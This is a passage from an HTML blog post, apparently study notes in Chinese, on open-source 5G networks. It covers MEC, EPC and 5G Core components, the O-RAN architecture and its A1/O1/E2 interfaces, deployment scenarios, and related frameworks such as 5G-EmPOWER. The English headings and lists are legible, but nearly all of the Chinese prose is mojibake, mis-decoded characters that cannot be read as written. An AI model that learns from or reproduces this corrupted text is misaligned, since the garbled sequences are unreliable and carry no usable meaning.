computing</h2><p>5Gé«˜æ•ˆèƒ½çš„è¨Šè™Ÿè™•ç†ã€å‚³è¼¸æ©Ÿåˆ¶ã€è³‡æ–™å‚³è¼¸ç‡ä»ç„¡æ³•æ»¿è¶³å…¶ååé‡å’Œå°ä½å»¶é²çš„è¦æ±‚ï¼Œåƒæ˜¯è™•ç†VR&#x2F;ARç­‰é€™ç¨®å³æ™‚æ€§é«˜çš„æ‡‰ç”¨ï¼Œè€Œ<strong>MEC</strong>èƒ½è§£æ±ºé€™å•é¡Œã€‚</p><p>MECå°‡æ¶æ§‹çš„åŸºæœ¬çµ„ä»¶ç§»åˆ°æ›´é è¿‘ä½¿ç”¨è€…çš„ä½ç½®ï¼Œé€šéå»ºç«‹åœ¨é‚Šç·£è¨ˆç®—ã€å…§å®¹ç·©å­˜ã€NFV å’Œ SDN çš„åŸºç¤ä¸Šï¼ŒMECç‚º 5G æ‡‰ç”¨çš„å»¶é²å’Œååé‡éœ€æ±‚æä¾›äº†æœ‰æ•ˆçš„è§£æ±ºæ–¹æ¡ˆã€‚</p><ol><li>ç”±æ–¼å…§å®¹èˆ‡è³‡æ–™åœ¨é‚Šç·£è¢«è™•ç†ï¼Œå› æ­¤è³‡æ–™åƒ…éœ€å¶è€Œå‚³è¼¸è‡³CNï¼Œé€²è€Œä½¿å‚³è¼¸å»¶é²æ™‚é–“é™ä½ï¼Œä¹Ÿä½¿CNè² æ“”é™ä½ã€‚</li><li>æ”¯æŒæœ¬åœ°åŒ–æœå‹™ä¾›æ‡‰ï¼Œæä¾›èœ‚çª©ç¶²è·¯å°ˆç¶²ï¼Œç”¨æ–¼å¥åº·ã€ç’°å¢ƒç›£æ¸¬ã€é‚Šç·£IOTé‹ç®—â€¦etc</li></ol><h2 id="Intelligence-in-the-network"><a href="#Intelligence-in-the-network" class="headerlink" title="Intelligence in the network"></a>Intelligence in the network</h2><p><code>ML/AI</code><br>è³‡æ–™é©…å‹•ã€è‡ªå‹•åŒ–çš„5Gç¶²è·¯è®Šæˆå¯èƒ½ï¼Œå¯ç”¨ä¸åŒçš„use caseå»è¨“ç·´ä¸¦æœ€ä½³åŒ–RAN<br>ç”¨ä¾‹ç¯„åœå¾é æ¸¬æµé‡éœ€æ±‚ä»¥æ“´å±• CN è³‡æº åˆ°æ¸›å°‘è¶…å¯é å’Œä½å»¶é²é€šä¿¡ (URLLC) ä¸­çš„å»¶é²</p><p>è€Œå¯¦ç¾é€™ç¨®æ–¹æ¡ˆçš„æ¡†æ¶å³ç‚ºO-RANï¼Œé€éèˆ‡gNB,eNBäº’å‹•çš„RICä¾†ç›£æ§è³‡æ–™ã€å­¸ç¿’èˆ‡åŸ·è¡Œé–‰è·¯é©…å‹•ã€‚</p><h1 id="The-radio-access-network"><a href="#The-radio-access-network" class="headerlink" title="The radio access network"></a>The radio access network</h1><blockquote><p>é€™ç« æè¿°ç”¨æ–¼éƒ¨å±¬4G&#x2F;5Gçš„é–‹æºå‡½å¼åº«å’Œæ¡†æ¶ï¼Œç´°ç¯€éƒ½å¯ä»¥åœ¨å°ˆæ¡ˆå®˜ç¶²æ‰¾åˆ°ï¼Œæ•…ä¸è´…è¿°</p></blockquote><h3 id="OpenAirInterface"><a href="#OpenAirInterface" class="headerlink" title="OpenAirInterface"></a>OpenAirInterface</h3><p><a href="https://openairinterface.org/">https://openairinterface.org/</a></p><h3 id="srsLTE"><a href="#srsLTE" class="headerlink" title="srsLTE"></a>srsLTE</h3><p><a href="https://www.srslte.com/">https://www.srslte.com/</a></p><h3 id="Radysis-open-source-RAN-contributions"><a href="#Radysis-open-source-RAN-contributions" class="headerlink" title="Radysis open source RAN contributions"></a>Radysis open source RAN contributions</h3><p><a href="https://www.radisys.com/solutions/openran">https://www.radisys.com/solutions/openran</a></p><h1 id="Core-Network"><a href="#Core-Network" class="headerlink" title="Core Network"></a>Core Network</h1><p>æ­¤ç« ç¯€é—¡è¿°é‡å°4ã€5Gçš„ä¸»æµé–‹æºæ–¹æ¡ˆ i.e. EPC, 5G Core</p><h2 id="Evolved-Packet-Core-EPC"><a href="#Evolved-Packet-Core-EPC" class="headerlink" title="Evolved Packet Core (EPC)"></a>Evolved Packet Core (EPC)</h2><p>4G EPCçš„å¯¦ç¾å·²åœ¨ 2.1ç¯€è¨è«–éï¼Œé€šå¸¸åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- MME(Mobile Management Entity)</span><br><span class="line">- Home Subscription Server(HSS)</span><br><span class="line">- Service Gateway(SGW)</span><br><span class="line">- Packet Gateway(PGW)</span><br></pre></td></tr></table></figure><p><strong>MME(Mobile Management Gateway)</strong></p><ul><li>èˆ‡UEå»ºç«‹é€£æ¥çš„æ§åˆ¶è¨Šæ¯</li><li>å°‹å‘¼èˆ‡ç§»å‹•æ€§ç¨‹åº</li><li>NASä¿¡ä»¤(signalling)</li><li>å®‰å…¨åŠŸèƒ½åƒæ˜¯è¿½è¹¤å€åŸŸåˆ—è¡¨ç®¡ç†</li><li>PGW&#x2F;SGWé¸æ“‡</li><li>UEèº«åˆ†èªè­‰</li><li>å¯é”æ€§ç¨‹åº</li><li>æ‰¿è¼‰ç®¡ç†(bearer management)<br>i.e. EPCæƒ…æ³ä¸‹ç‚ºUEèˆ‡PGWä¹‹é–“çš„é€šé“ï¼Œ5GCæƒ…æ³ä¸‹ç‚ºUEèˆ‡UPFä¹‹é–“çš„é€šé“</li><li>æ”¯æ´EPCèˆ‡E-UTRANä¹‹é–“çš„æ§åˆ¶å¹³é¢ä¿¡ä»¤å”å®š</li><li>å¯é çš„è¨Šæ¯å‚³è¼¸æœå‹™</li><li>æ”¯æ´ç”¨æ–¼UDPæ§åˆ¶è¨Šæ¯çš„é€šé“å”å®š</li><li>æ”¯æ´ç”¨æ–¼å°UEé€²è¡Œèªè­‰ã€æˆæ¬Šã€è¨ˆè²»çš„å”å®š</li></ul><p><strong>HSS(Home Subscription Server)</strong></p><ul><li>User Database: å„²å­˜subscriberè³‡æ–™(id èˆ‡ key)</li><li>User Authentication</li><li>æä¾›Userèˆ‡MMEä¹‹é–“çš„ä»‹é¢</li></ul><p>SGWèˆ‡PGWçµ„ä»¶é€šé <strong><a href="https://zh.wikipedia.org/zh-tw/GPRS%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE">GTP</a></strong> ç‚ºç”¨æˆ¶èˆ‡æ§åˆ¶å¹³é¢å‚³é€è³‡æ–™<br>i.e. GRPS Tunneling Protocol User Plane(GTP-U)ã€GRPS Tunneling Protocol Control Plane(GTP-C) ä¸¦ä½¿ç”¨UDPä½œç‚ºå‚³è¼¸å±¤å”å®š</p><div class="note info flat"><p>GTP 5Gä¹Ÿæœ‰å¯¦ä½œï¼Œå»å¹´è¢«çˆ†å‡ºæ´<br>ã€€<a href="https://www.ithome.com.tw/news/138340">https://www.ithome.com.tw/news/138340</a><br>ã€€<a href="https://itw01.com/8JS4VEH.html">https://itw01.com/8JS4VEH.html</a></p></div><p>æ”¯æ´Packet Routingå’ŒForwardingï¼Œåˆ†é…IPä½å€çµ¦UEï¼ŒPagingæ©Ÿåˆ¶ï¼Œæ”¯æ´LTE EPCçš„é–‹æºå°ˆæ¡ˆæœ‰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- OpenAirInterface(with OAI-CN)</span><br><span class="line">- srsLTE(with srsEPC)</span><br><span class="line">- Open5GS</span><br><span class="line">- Open Mobile Evolved Core(OMEC)</span><br></pre></td></tr></table></figure><p>å„é–‹æºå°ˆæ¡ˆå°æ–¼EPCå„ä»‹é¢å¯¦ä½œæƒ…æ³<br><img src="https://i.imgur.com/671qK43.png"></p><h2 id="5G-Core"><a href="#5G-Core" class="headerlink" title="5G Core"></a>5G Core</h2><p><img src="https://i.imgur.com/pZoXlQI.png"></p><p>ç›®å‰å¯¦è¸5Gæ ¸ç¶²çš„é–‹æºå°ˆæ¡ˆæ˜¯<strong>Free5GC</strong>ï¼Œæ˜¯åŸºæ–¼NextEPC(ç¾åœ¨çš„Open5GS)å»å¯¦ä½œçš„ï¼Œ<br>æä¾›</p><ul><li>ä½¿ç”¨è€…å­˜å–ã€ç§»å‹•æ€§ã€æœƒè©±(AMFèˆ‡SMF)ç®¡ç†</li><li>ç”±å…¶ä»–NFæä¾›çš„æœå‹™ç™¼ç¾(Service Discovery)åŠŸèƒ½  (NRF)</li><li>æä¾›NFsä¾†é¸æ“‡åˆ†é…UEçš„åˆ‡ç‰‡ (Network Slice Selection Function)</li><li>ç®¡ç†ã€å„²å­˜ã€å–å¾—ä½¿ç”¨è€…è³‡æ–™ (UDMã€UDR)</li><li>UEçš„èªè­‰ (AUSF)</li><li>æ ¸ç¶²çš„é‹ç‡Ÿèˆ‡ç®¡ç† (Operations, Administration and Maintenance (OAM))</li><li>ç¶²è·¯ç·¨æ’ â€¦etc</li></ul><p>æœ‰è¢«free5gcå¯¦ä½œå‡ºçš„3GPPä»‹é¢:</p><ul><li><strong>N1&#x2F;N2</strong>: åˆ†åˆ¥é€£æ¥AMFåˆ°UEèˆ‡RANï¼Œç”¨ä¾†é€²è¡Œæœƒè©±èˆ‡ç§»å‹•æ€§ç®¡ç†</li><li><strong>N3&#x2F;N4&#x2F;N6</strong>: åˆ†åˆ¥é€£æ¥UPFåˆ°RAN,SMF,èˆ‡ç¶²è·¯(data network)</li><li><strong>N8</strong>: é€£æ¥UDM èˆ‡ AMFï¼Œé€²è¡Œä½¿ç”¨è€…èªè­‰ç¨‹åº</li><li><strong>N10&#x2F;N11</strong>: åˆ†åˆ¥é€£æ¥SMFåˆ°UDMèˆ‡AMFï¼Œè² è²¬è™•ç†è¨‚é–±åŠæœƒè©±ç®¡ç†è«‹æ±‚</li><li><strong>N12&#x2F;N13</strong>: åˆ†åˆ¥é€£æ¥AUSFåˆ°AMFèˆ‡UDMï¼Œå®ƒå€‘å•Ÿç”¨èªè­‰æœå‹™</li></ul><h1 id="RAN-and-core-frameworks"><a href="#RAN-and-core-frameworks" class="headerlink" title="RAN and core frameworks"></a>RAN and core frameworks</h1><p>é€™ç« æè¿°äº†å¤šå€‹é‹ç”¨åœ¨RANèˆ‡æ ¸ç¶²çš„<strong>é–‹æ”¾æ¡†æ¶</strong><br>é›–ç„¶ç¬¬ä¸‰ã€å››ç« æ‰€è¬›çš„è»Ÿé«”å¯ä»¥åŸ·è¡Œç‰¹å®šåŠŸèƒ½ï¼Œä½†ä»¥ä¸‹æ®µè½æ‰€ä»‹ç´¹çš„æ¡†æ¶æ›´é€šç”¨ä¸”ç¯„åœæ›´å»£ï¼Œä¸¦èˆ‡RANã€CNç”¨æ–¼ç®¡ç†ã€æ§åˆ¶èˆ‡å”èª¿</p><p><em>é–‹æ”¾æ¡†æ¶èˆ‡æ¶æ§‹æ•´ç†</em><br><img src="https://i.imgur.com/qE16Kyt.png"></p><h2 id="O-RAN"><a href="#O-RAN" class="headerlink" title="O-RAN"></a>O-RAN</h2><p>ç”±O-RANè¯ç›Ÿæ‰€æå€¡çš„é‡å°vRANçš„é–‹æ”¾æ¨™æº–å®šç¾©ï¼Œä¸¦æœ‰å…©å¤§ç›®æ¨™ã€‚<br>ç¬¬ä¸€å€‹æ˜¯è—‰ç”±éƒ¨å±¬åœ¨edgeçš„æ™ºæ…§æ§åˆ¶å™¨ä¾†æ•´åˆML,AIæŠ€è¡“<br>ç¬¬äºŒå€‹æ˜¯å°æ–¼é–‹æ”¾èˆ‡æ•æ·çš„å®šç¾©ï¼Œç”±RANçš„ä¸åŒå…ƒä»¶ä¹‹é–“å®šç¾©æ˜ç¢ºçš„ä»‹é¢ä¾†å¯¦ç¾ï¼Œ<br><strong>ç”±æ–¼O-RANå¿…é ˆå…¬é–‹ç›¸åŒçš„APIï¼Œå› æ­¤å¾ˆå®¹æ˜“å°‡çµ„ä»¶æ›¿æ›ç‚ºå…¶ä»–ç›¸åŒåŠŸèƒ½çš„æ›¿ä»£çµ„ä»¶</strong> é€™ç¨®ä½œæ³•ä½¿5G O-RANå¯ä»¥æ•´åˆä¸åŒå» å•†çš„å…ƒä»¶ã€‚</p><p><img src="https://i.imgur.com/LP2jmRl.png"></p><h3 id="O-RAN-architecture"><a href="#O-RAN-architecture" class="headerlink" title="O-RAN architecture"></a>O-RAN architecture</h3><p>æœ€é ‚éƒ¨çš„SMOé‹è¡Œè‘—ä¸€å€‹non-RT RICï¼Œå®ƒä»¥é«˜æ–¼1ç§’çš„ç²’åº¦(granularity)åŸ·è¡Œ<strong>æ§åˆ¶æ±ºå®š</strong>(control decisions)ï¼Œå®ƒå¯ä»¥æä¾›O-RANä¸åŒåŠŸèƒ½ï¼Œä¾‹å¦‚èªªå¯ä»¥é‡å°RANæ‰€æä¾›çš„è³‡æ–™ä¾†è¨“ç·´ä¸åŒçš„æ¼”ç®—æ³•ã€‚</p><p>ç„¶è€Œ near-RT RICï¼Œé‹è¡Œè‘—ä¸€å€‹<strong>æ§åˆ¶è¿´åœˆ</strong>ï¼Œä¸¦ä¸”æœ‰è‘—æ¯”è¼ƒå¯†é›†çš„æ™‚é–“å€é–“(decision &lt; 10 ms)ï¼Œæœƒä¾è³´RANä¸åŒçš„start,stop,overrideæˆ–control çš„å‹åˆ¥è€Œæœ‰æ‰€ä¸åŒ e.g. radio resource management</p><p><strong>é€™äº›APIå¯è¢«å®‰è£åœ¨near-RT RICä¸Šçš„æ‡‰ç”¨ç¨‹å¼(åˆç¨±xApps)ä¾†ä½¿ç”¨</strong><br>è€Œé€™äº›xAppså¯ç”±ç¬¬ä¸‰æ–¹å¯¦é«”æ‰€é–‹ç™¼ä¸¦å¾å…¬å…±å•†åº—(marketplace)ä¸­å–å¾—ã€‚<br>èˆ‰ä¾‹ä¾†èªªï¼Œè—‰ç”±near-RT RICå’Œå®ƒçš„xAppsï¼Œç‡Ÿé‹å•†å¯ä»¥æ§åˆ¶ç”¨æˆ¶ç§»å‹•éç¨‹(user mobility processesï¼Œå³ handovers)ï¼Œæ ¹æ“šé æ¸¬çš„è¯ç¶²è»Šè¼›å’Œç„¡äººæ©Ÿçš„è·¯å¾‘ä¾†åˆ†é…ç¶²è·¯è³‡æºï¼ŒåŸ·è¡Œè² è¼‰å¹³è¡¡å’Œäº¤é€šè½‰å‘ä¸¦å„ªåŒ–æ’ç¨‹ç­–ç•¥ã€‚near-RT RICä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨non-RT RICä¸­æ‰€è¨“ç·´çš„æ¼”ç®—æ³•ä¾†åšé»äº‹ã€‚</p><p>O-RANçš„å…¶ä»–çµ„ä»¶åƒæ˜¯CU&#x2F;DU&#x2F;RUï¼Œåƒæ˜¯5G gNBè¢«æ‹†åˆ†æˆCU&#x2F;DU&#x2F;RUå’Œ4G eNBã€‚CUåˆè¢«é€²ä¸€æ­¥æ‹†åˆ†æˆï¼Œæ§åˆ¶é¢CUè·Ÿç”¨æˆ¶é¢CUã€‚æ ¹æ“š3GPPå°æ–¼ä¸åŒæ‹†åˆ†çš„å®šç¾©ï¼ŒO-RANé¸æ“‡ <strong>split 7-2x</strong> ä½œç‚ºDU&#x2F;RUçš„æ‹†åˆ†ï¼›å› æ­¤åœ¨ç·¨ç¢¼ã€èª¿è®Šã€å’Œmappingè³‡æºéƒ½æ˜¯ç”±DUåšçš„ï¼›ç„¶å’Œè§£èª¿è®Šã€cyclic prefix additionå’Œdigital to analogå‰‡æ˜¯åœ¨RUä¸­å¯¦ç¾ï¼Œè€Œprecodingå‰‡æ˜¯åœ¨å…©è€…ä¸­éƒ½è¡Œã€‚</p><h3 id="O-RAN-interfaces"><a href="#O-RAN-interfaces" class="headerlink" title="O-RAN interfaces"></a>O-RAN interfaces</h3><p>å…©å€‹RICä¹‹é–“çš„ä»‹é¢ç‚ºA1ä»‹é¢ï¼Œè€Œnon-RT RICä½¿ç”¨ O1ä»‹é¢èˆ‡RICå’Œ4G eNBäº’å‹•</p><ul><li><p>A1ä»‹é¢è®“near-RT RICå¯æä¾›:</p><ul><li>policy-based guidance to near-RT RIC(ä»¥é˜²å®ƒåµæ¸¬åˆ°å…¶æåšæœªå¯¦ç¾RANçš„æ•ˆèƒ½ç›®æ¨™)</li><li>ç®¡ç†ML Model</li><li>å‘near-RT RICæä¾›è±å¯Œè³‡è¨Šï¼Œä¾‹å¦‚å¾RANå¤–éƒ¨ä¾†æºï¼Œä¾†æ›´é€²ä¸€æ­¥ç²¾ç´°RANçš„å„ªåŒ–</li></ul></li><li><p>O1ä»‹é¢ï¼Œå‰‡æ˜¯å…·å‚™æ“ä½œèˆ‡ç®¡ç†åŠŸèƒ½ï¼Œä¸¦åŠªåŠ›èˆ‡ç¾æœ‰æ¨™æº–å…¼å®¹ä¾†å¯¦ç¾èˆ‡ç¾æœ‰æ¡†æ¶çš„å®Œç¾æ•´åˆï¼Œä¾‹å¦‚èªªä»–ä»°è³´NETCONFæˆ–å…¶ä»–3GPPæ‰€å®šç¾©çš„APIã€‚</p></li><li><p>non-RT RICä½¿ç”¨O1ä»‹é¢ä¾†:</p><ul><li>ä¾›æ‡‰ç®¡ç†(provision management)</li><li>æ•…éšœç›£ç£(fault supervision)</li><li>æ•ˆèƒ½ä¿è­‰æœå‹™ (performance assurance services)</li><li>å•Ÿå‹•ã€è¨»å†Šå’Œæ›´æ–°å¯¦é«”è¨­å‚™</li><li>ç®¡ç†é€šè¨Šç›£æ§è¨­å‚™</li></ul></li><li><p>near-RT RICä¹Ÿæš´éœ²äº†E2ä»‹é¢åˆ°å…¶ä»–ä¸åŒå…ƒä»¶ä¸Š(CU,DU,eNB)ï¼›é€™å€‹ä»‹é¢åªå°ˆæ³¨éƒ¨å±¬</p><ol><li>near-RT RICå°æ–¼E2ä»‹é¢çµ‚ç«¯ç¯€é»çš„æ§åˆ¶æ“ä½œ</li><li>ç®¡ç†RICå’Œé€™äº›ç¯€é»äº’å‹•è¡Œç‚º</li></ol></li><li><p>E1èˆ‡F1ä»‹é¢ç¬¦åˆ3GPPçš„è¦ç¯„ã€‚</p></li></ul><p>E1ä»‹é¢è·‘åœ¨æ§åˆ¶èˆ‡ç”¨æˆ¶é¢CUä¹‹é–“ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ç‰¹å®šUEçš„traceè’é›†èˆ‡æ‰¿è¼‰å»ºç«‹(bearer setup)å’Œç®¡è£¡<br>F1ä»‹é¢å‰‡æ˜¯è·‘åœ¨CUèˆ‡DUä¹‹é–“ï¼Œå®ƒæœ‰å…©å€‹ä¸åŒçš„ç‰ˆæœ¬ï¼Œä¸€å€‹æ˜¯é€£æ¥åˆ°æ§åˆ¶é¢CUå¦ä¸€å€‹å‰‡æ˜¯ç”¨æˆ¶é¢CUï¼›F1è² è²¬åœ¨CUèˆ‡DUä¹‹é–“å‚³é€ä¿¡ä»¤(signaling)å’Œè³‡æ–™ï¼Œä»¥åŸ·è¡Œ<strong>RPCç¨‹åº</strong> å’Œ<strong>PDCP-RLCäº¤æ›</strong>ã€‚</p><p>æœ€å¾Œï¼Œèˆ‡RUä¹‹é–“çš„ä»‹é¢ï¼Œå‰‡æ˜¯ç”±O-RANå…§éƒ¨çš„Open Fronthaulå·¥ä½œçµ„ä¾†åˆ¶å®šï¼Œé€™å€‹ä»‹é¢æ”œå¸¶ç”¨æ–¼data planeçš„<strong>compressed IQ samples</strong>å’Œç”¨æ–¼beamformingå’Œå…¶ä»–ç‰©ç†å±¤ç¨‹åºçš„æ§åˆ¶æ¶ˆæ¯ã€‚</p><h3 id="O-RAN-Deployment-Options"><a href="#O-RAN-Deployment-Options" class="headerlink" title="O-RAN Deployment Options"></a>O-RAN Deployment Options</h3><p>O-RANè¨­æƒ³äº†ä¸åŒçš„éƒ¨å±¬ç­–ç•¥ï¼Œåˆ†åˆ¥æ˜¯åœ¨å€åŸŸ(regional)æˆ–é‚Šç·£é›²(edge cloud)æˆ–è€…æ˜¯åœ¨ç‡Ÿé‹å•†æ“æœ‰çš„èœ‚çª©åŸºç«™ã€‚æ¯å€‹è¨­æ–½éƒ½å¯ä»¥é‹è¡ŒO-Cloudï¼Œå³å®¹å™¨å’Œè™›æ“¬æ©Ÿï¼Œä½¿ç”¨é–‹æ”¾ä»‹é¢åŸ·è¡ŒO-RANç¨‹å¼ï¼Œ<br>æˆ–æ˜¯æœ‰å€‹å°ˆç”¨çš„ç«™é»ä½¿ç”¨O-RANçš„é–‹æ”¾APIä½†å¯ä»¥é‹è¡Œé–‰æºç¨‹å¼ç¢¼(closed source code)ï¼Œå…©ç¨®æƒ…æ³ä¸‹åœ–çš†æœ‰æè¿°ï¼Œå…¶æè¿°äº†6ç¨®ä¸åŒçš„O-RANéƒ¨å±¬çµ„åˆ</p><p><img src="https://i.imgur.com/dxigwNb.png"></p><p>åœ¨ Scenario Aï¼Œæ‰€æœ‰å…ƒä»¶é™¤äº†RUä»¥å¤–ï¼Œéƒ½éƒ¨å±¬åœ¨ç¶²è·¯é‚Šç·£ï¼Œå…±åŒä½æ–¼<strong>èˆ‡fronthaulå…‰çº–é€£æ¥çš„</strong> ç›¸åŒçš„è³‡æ–™ä¸­å¿ƒã€‚</p><p>å…¶ä»–éƒ¨å±¬ç­–ç•¥æ˜¯ RICèˆ‡CUå…±åŒéƒ¨å±¬åœ¨å€åŸŸé›²è¨­æ–½ä¸­ï¼Œè€ŒDUèˆ‡RUä½æ–¼ç¶²è·¯é‚Šç·£æˆ–æ˜¯èœ‚çª©åŸºç«™ä¸Šï¼Œè€Œé¦–é¸çš„éƒ¨å±¬ç­–ç•¥æ˜¯ <strong>Scenario B</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RICåœ¨å€åŸŸé›²ä¸Š</span><br><span class="line">CUs,DUsåœ¨edge</span><br><span class="line">åªæœ‰RUæ˜¯åœ¨ç‡Ÿé‹å•†çš„èœ‚çª©åŸºç«™ä¸Š</span><br></pre></td></tr></table></figure><h3 id="The-O-RAN-Software-Community"><a href="#The-O-RAN-Software-Community" class="headerlink" title="The O-RAN Software Community"></a>The O-RAN Software Community</h3><p>é™¤äº†æ¨™æº–åŒ–æ´»å‹•ï¼ŒO-RANä¹Ÿæœ‰è»Ÿé«”ç¤¾ç¾¤(OSC)ï¼Œèˆ‡Linux Foundationåˆä½œï¼Œè²¢ç»ç¬¦åˆO-RANè¦ç¯„çš„5Gè»Ÿé«”</p><p>ç¬¬ä¸€å€‹ç‰ˆæœ¬çš„é‡‹å‡ºæ˜¯2019çš„Amber release<br>ç¬¬äºŒå€‹ç‰ˆæœ¬æ˜¯2020çš„Bronze release</p><p>é€™äº› releaseåŒ…å«äº†Dockerå®¹å™¨å’Œå¤šå€‹O-rançµ„ä»¶çš„é–‹æºè»Ÿé«”:</p><ul><li>non-RT RIC :å…·æœ‰A1ä»‹é¢æ§åˆ¶å™¨å’Œç®¡ç†AIæ¨¡å‹çš„èƒ½åŠ›</li><li>near-RT RIC å¹³å°: å…·æœ‰å¤šå€‹æ‡‰ç”¨ç¨‹åºï¼Œåƒæ˜¯:<ul><li>admission control</li><li>UE manager</li><li>performance and measurement monitor<br>  å¯è—‰ç”±E2ä»‹é¢èˆ‡DUæºé€š</li></ul></li><li>DU:<ul><li>ä¸€å€‹åˆå§‹ç‰ˆæœ¬çš„fronthaulå‡½å¼åº«</li></ul></li><li>ä¸€å€‹ç”¨æ–¼æ“ä½œã€ç®¡ç†ã€ç¶­è­·ä»¥åŠè™›æ“¬åŒ–æ¶æ§‹çš„æ¡†æ¶</li><li>simulator:<ul><li>ç”¨æ–¼æ¸¬è©¦å„å€‹ä»‹é¢</li></ul></li></ul><p>è€Œ cherry release å‰‡æ˜¯å˜—è©¦é€éRICå®Œæˆä¸åŒRAN Componentä¹‹é–“çš„æ•´åˆã€‚</p><blockquote><p>ç›®å‰æœ€æ–°ç™¼è¡Œç‰ˆç‚º<a href="https://wiki.o-ran-sc.org/display/REL/F+Release">F-Release</a></p></blockquote><p>è€Œ <strong>SD-RAN</strong> å°ˆæ¡ˆä¹Ÿæ­£åœ¨é ˜å°ã€é–‹ç™¼ä¸€é …é–‹ç™¼å·¥ä½œï¼Œç›®æ¨™æ˜¯å¯¦ç¾èˆ‡O-RAN RICä»‹é¢æ•´åˆçš„é–‹æºè¦ã€ç¬¦åˆ3GPPçš„RANã€‚</p><h2 id="Open-Networking-Foundation-frameworks"><a href="#Open-Networking-Foundation-frameworks" class="headerlink" title="Open Networking Foundation frameworks"></a>Open Networking Foundation frameworks</h2><p>ç”±å¤šå®¶é›»ä¿¡ç‡Ÿé‹å•†çµ„æˆçš„è¯ç›Ÿï¼Œé€™äº›é‹ç‡Ÿå•†æä¾›ç”¨æ–¼éƒ¨å±¬å…¶ç¶²è·¯é–‹æºç¨‹å¼ä»¥åŠæ¡†æ¶<br>åŒ…å«: OMECã€SD-RANã€ONOS<br>Components Projects ç‚ºäº†ç‰¹å®šç›®çš„æ¡†æ¶èˆ‡è»Ÿé«”ï¼Œè€ŒExemplaråŒ…å«äº†è¨±å¤šçš„ Components Projectsã€‚</p><h2 id="Other-frameworks-and-projects"><a href="#Other-frameworks-and-projects" class="headerlink" title="Other frameworks and projects"></a>Other frameworks and projects</h2><p>é™¤äº†O-RANèˆ‡ONFæ–¹æ¡ˆï¼Œè¨±å¤šé–‹æºç¤¾ç¾¤ä¹Ÿé‡‹å‡ºäº†é‡å°é€£é€šæ€§ã€åˆ‡ç‰‡å’Œæ ¸å¿ƒçš„æ¡†æ¶èˆ‡å°ˆæ¡ˆ</p><h3 id="5G-EmPOWER"><a href="#5G-EmPOWER" class="headerlink" title="5G-EmPOWER"></a>5G-EmPOWER</h3><p>æ˜¯ä¸€å¥—ç”¨æ–¼<strong>ç•°æ§‹(heterogenous)</strong> RANæ¶æ§‹çš„ä½œæ¥­ç³»çµ±ï¼Œå®ƒç”±ä¸€å€‹é–‹æºã€å¯é‡æ–°ç¨‹å¼åŒ–çš„è»Ÿé«”å¹³å°çµ„æˆï¼Œè©²å¹³å°å°‡ç‰©ç†åŸºç¤è¨­æ–½æŠ½è±¡åŒ–ï¼Œä¸¦æä¾›é«˜éšAPIä¾†æ“æ§RANåŠŸèƒ½ã€‚</p><p>5G-EmPOWER ä¹Ÿå°‡æ§åˆ¶å¹³é¢å’Œç”¨æˆ¶å¹³é¢åˆ†é–‹ï¼Œé€™ç¨®åˆ†é›¢å¯¦éš›ä¸Šæ˜¯ç”±å…©å€‹ä¸»è¦çµ„ä»¶çµ„æˆ: ä¸€å€‹ä¸­å¤®æ§åˆ¶å™¨èˆ‡ä¸€çµ„ä»£ç†ã€‚<br><strong>ä¸­å¤®æ§åˆ¶å™¨:</strong></p><ol><li>ä½œç‚ºOSï¼Œä¸¦ä¸”å®Œå…¨äº†è§£ç‰©ç†åŸºç¤è¨­æ–½åŠŸèƒ½</li><li>é€éOpenEmpowerå”å®šä¾†ç™¼é€æ§åˆ¶æŒ‡ä»¤ä»¥ç·¨æ’ä»£ç†çš„è¡Œç‚º</li></ol><p><strong>ä»£ç†:</strong></p><ol><li>é‹è¡Œåœ¨æ¯å€‹ç¶²è·¯å–®å…ƒä¸Š</li><li>å°‡åº•å±¤RANç‰¹å®šçš„å”å®š(LTEã€Wifi)å¯¦ä½œ æŠ½è±¡åŒ–åˆ°æ§åˆ¶å™¨</li><li>æ ¹æ“šæ§åˆ¶å™¨çš„æŒ‡ä»¤ä¾†ä¿®æ”¹åº•å±¤å”å®šåƒæ•¸</li></ol><p>5G-EmPOWERç›®å‰æ”¯æ´å¤šç¨®ç„¡ç·šé›»å­˜å–æŠ€è¡“(Radio Access Technologies, RAT)<br>åŒ…å«LTEã€Wifiã€LoRa  (5G NRå°šæœªæ”¯æ´)</p><p>æ­¤å¤–é‚„æœ‰ä»¥ä¸‹å°ˆæ¡ˆ:</p><ul><li>FlexRAN</li><li>Magma</li><li>LL-MEC</li><li>LightEdge</li><li>OpenRAN (ä¸ç­‰æ–¼O-RAN Projects)</li><li>Akraino REC</li><li>NVIDIA Aerial</li></ul><h2 id="Open-virtualization-and-management-frameworks"><a href="#Open-virtualization-and-management-frameworks" class="headerlink" title="Open virtualization and management frameworks"></a>Open virtualization and management frameworks</h2><p>é™¤äº†RANèˆ‡CNè»Ÿé«”ï¼Œè™›æ“¬åŒ–èˆ‡ç®¡ç†æ¡†æ¶ä¹Ÿæ‰®æ¼”é‡è¦çš„è§’è‰²ã€‚</p><blockquote><p>ETSIå®šç¾©äº†ä¸€å€‹NFV MANOæ¡†æ¶(Management and Orchestration)æ‡‰æœ‰çš„å…±åŒç‰¹å¾µï¼Œä¸»è¦æ˜¯ç‚ºäº†ç·¨æ’(Orchestrating)ç¶²è·¯åŠŸèƒ½(NF)</p></blockquote><p><img src="https://i.imgur.com/IjG4wat.png"><br><em>ä¸Šåœ–æŒ‡å‡ºé€™äº›NFVå°æ‡‰åœ¨5Gç”Ÿæ…‹åœˆä¸­çš„å“ªå€‹éƒ¨åˆ†</em></p><p><strong>NFV Orchestrators</strong> è² è²¬æä¾›ç¶²è·¯æœå‹™ï¼Œi.e. å¯¦é«”åŠè™›æ“¬ç¶²è·¯åŠŸèƒ½(PNF&#x2F;VNF)çš„çµåˆèƒ½å¤ 